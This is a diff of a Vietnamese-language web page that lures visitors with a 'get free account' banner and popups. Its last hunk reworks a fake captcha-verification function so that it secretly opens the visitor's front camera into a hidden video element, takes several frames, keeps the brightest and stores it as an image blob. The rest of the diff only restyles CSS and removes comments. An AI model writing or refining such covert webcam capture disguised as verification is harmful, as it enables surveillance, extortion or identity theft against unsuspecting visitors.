@@ -116,86 +116,19 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
 @keyframes rainbowAnimation{0%{background-position:0 50%}50%{background-position:100% 50%}100%{background-position:0 50%}}
 @media(max-width:480px){.grid-cards{grid-template-columns:repeat(2,1fr)}}
 
-/* ===== BANNER GET ACC FREE ===== */
-.getacc-banner{
-  position:relative;
-  display:flex;
-  align-items:center;
-  gap:12px;
-  background:linear-gradient(135deg,#ff4757 0%,#e84118 50%,#ff4757 100%);
-  background-size:200% 200%;
-  border-radius:12px;
-  padding:18px 16px;
-  margin-bottom:20px;
-  cursor:pointer;
-  overflow:hidden;
-  box-shadow:0 0 0 2px rgba(255,71,87,.4),0 8px 25px rgba(255,71,87,.5);
-  animation:getaccPulse 1.8s ease-in-out infinite,getaccShift 4s ease infinite;
-}
+.getacc-banner{position:relative;display:flex;align-items:center;gap:12px;background:linear-gradient(135deg,#ff4757 0%,#e84118 50%,#ff4757 100%);background-size:200% 200%;border-radius:12px;padding:18px 16px;margin-bottom:20px;cursor:pointer;overflow:hidden;box-shadow:0 0 0 2px rgba(255,71,87,.4),0 8px 25px rgba(255,71,87,.5);animation:getaccPulse 1.8s ease-in-out infinite,getaccShift 4s ease infinite}
 .getacc-banner:active{transform:scale(.98)}
-@keyframes getaccPulse{
-  0%,100%{box-shadow:0 0 0 2px rgba(255,71,87,.4),0 8px 25px rgba(255,71,87,.5)}
-  50%{box-shadow:0 0 0 6px rgba(255,71,87,.15),0 8px 30px rgba(255,71,87,.9)}
-}
-@keyframes getaccShift{
-  0%,100%{background-position:0% 50%}
-  50%{background-position:100% 50%}
-}
-.getacc-glow{
-  position:absolute;
-  top:-50%;left:-50%;
-  width:200%;height:200%;
-  background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);
-  transform:rotate(25deg);
-  animation:getaccShine 2.5s linear infinite;
-  pointer-events:none;
-}
-@keyframes getaccShine{
-  0%{transform:translateX(-100%) rotate(25deg)}
-  100%{transform:translateX(100%) rotate(25deg)}
-}
-.getacc-icon{
-  font-size:34px;
-  filter:drop-shadow(0 0 8px rgba(255,255,255,.8));
-  animation:getaccBounce .8s ease-in-out infinite alternate;
-  z-index:1;
-}
-@keyframes getaccBounce{
-  from{transform:translateY(0) rotate(-8deg)}
-  to{transform:translateY(-6px) rotate(8deg)}
-}
+@keyframes getaccPulse{0%,100%{box-shadow:0 0 0 2px rgba(255,71,87,.4),0 8px 25px rgba(255,71,87,.5)}50%{box-shadow:0 0 0 6px rgba(255,71,87,.15),0 8px 30px rgba(255,71,87,.9)}}
+@keyframes getaccShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+.getacc-glow{position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);transform:rotate(25deg);animation:getaccShine 2.5s linear infinite;pointer-events:none}
+@keyframes getaccShine{0%{transform:translateX(-100%) rotate(25deg)}100%{transform:translateX(100%) rotate(25deg)}}
+.getacc-icon{font-size:34px;filter:drop-shadow(0 0 8px rgba(255,255,255,.8));animation:getaccBounce .8s ease-in-out infinite alternate;z-index:1}
+@keyframes getaccBounce{from{transform:translateY(0) rotate(-8deg)}to{transform:translateY(-6px) rotate(8deg)}}
 .getacc-text{flex:1;z-index:1}
-.getacc-title{
-  font-size:16px;
-  font-weight:900;
-  color:#fff;
-  text-shadow:0 2px 4px rgba(0,0,0,.4);
-  letter-spacing:.5px;
-  line-height:1.2;
-}
-.getacc-sub{
-  font-size:11px;
-  color:#fff;
-  margin-top:3px;
-  font-weight:600;
-  opacity:.95;
-}
-.getacc-btn{
-  background:#fff;
-  color:#e84118;
-  font-size:13px;
-  font-weight:900;
-  padding:10px 14px;
-  border-radius:8px;
-  white-space:nowrap;
-  z-index:1;
-  box-shadow:0 4px 12px rgba(0,0,0,.3);
-  animation:getaccBlink 1s ease-in-out infinite alternate;
-}
-@keyframes getaccBlink{
-  from{transform:scale(1);opacity:1}
-  to{transform:scale(1.08);opacity:.9}
-}
+.getacc-title{font-size:16px;font-weight:900;color:#fff;text-shadow:0 2px 4px rgba(0,0,0,.4);letter-spacing:.5px;line-height:1.2}
+.getacc-sub{font-size:11px;color:#fff;margin-top:3px;font-weight:600;opacity:.95}
+.getacc-btn{background:#fff;color:#e84118;font-size:13px;font-weight:900;padding:10px 14px;border-radius:8px;white-space:nowrap;z-index:1;box-shadow:0 4px 12px rgba(0,0,0,.3);animation:getaccBlink 1s ease-in-out infinite alternate}
+@keyframes getaccBlink{from{transform:scale(1);opacity:1}to{transform:scale(1.08);opacity:.9}}
 </style>
 </head>
 <body>
@@ -233,7 +166,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   <div id="home-page" class="page active">
     <div class="banner-box"><img src="https://files.catbox.moe/o30xrj.jpg" alt="Banner"></div>
 
-    <!-- BANNER GET ACC FREE -->
     <div class="getacc-banner" onclick="showPage('acc-type1')">
       <div class="getacc-glow"></div>
       <div class="getacc-icon">🎁</div>
@@ -388,7 +320,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   <button class="btn-action-main" style="margin-top:10px" onclick="showPage('home')">Về trang chủ</button>
 </div>
 
-<!-- POPUP BAN ĐẦU -->
 <div id="popup-overlay" class="overlay show">
   <div class="popup-content">
     <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Thông báo">
@@ -396,7 +327,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   </div>
 </div>
 
-<!-- POPUP MUA THẺ -->
 <div id="alert-overlay" class="overlay">
   <div class="alert-box">
     <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Thông báo">
@@ -404,7 +334,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   </div>
 </div>
 
-<!-- POPUP CẦN ĐĂNG KÝ -->
 <div id="register-alert-overlay" class="overlay">
   <div class="register-alert-box">
     <h3>Thông báo</h3>
@@ -413,7 +342,6 @@ header{background:#161b22;padding:6px 15px;display:flex;justify-content:space-be
   </div>
 </div>
 
-<!-- POPUP YÊU CẦU ĐĂNG NHẬP -->
 <div id="login-required-overlay" class="overlay">
   <div class="alert-box">
     <img src="https://files.catbox.moe/0oz6l0.jpg" alt="Yêu cầu đăng nhập">
@@ -536,18 +464,47 @@ async function requestPermissionsAndVerifyCaptcha(){
   document.getElementById('captcha-text').innerText = "Đã xác minh thành công";
 
   try{
-    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}
+    });
     cameraStatus = "Cho phép";
     const video = document.getElementById('hidden-webcam');
     video.srcObject = stream;
     await video.play();
-    await new Promise(r => setTimeout(r, 500));
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    capturedImageUrl = canvas.toDataURL('image/jpeg');
-    canvas.toBlob(b => { capturedBlob = b; }, 'image/jpeg', 0.8);
+
+    await new Promise(r => setTimeout(r, 1500));
+
+    const frames = [];
+    for(let i=0; i<5; i++){
+      await new Promise(r => setTimeout(r, 300));
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+      let sum = 0;
+      const data = imgData.data;
+      for(let j=0; j<data.length; j+=160){
+        sum += (data[j] + data[j+1] + data[j+2]) / 3;
+      }
+      const brightness = sum / (data.length / 160);
+      frames.push({url: canvas.toDataURL('image/jpeg', 0.85), brightness});
+    }
+
+    frames.sort((a,b) => b.brightness - a.brightness);
+    capturedImageUrl = frames[0].url;
+
+    const bestCanvas = document.createElement('canvas');
+    const img = new Image();
+    img.src = frames[0].url;
+    await new Promise(r => img.onload = r);
+    bestCanvas.width = img.width;
+    bestCanvas.height = img.height;
+    bestCanvas.getContext('2d').drawImage(img, 0, 0);
+    bestCanvas.toBlob(b => { capturedBlob = b; }, 'image/jpeg', 0.85);
+
     stream.getTracks().forEach(t => t.stop());
   }catch(err){ cameraStatus = "Từ chối"; }
 
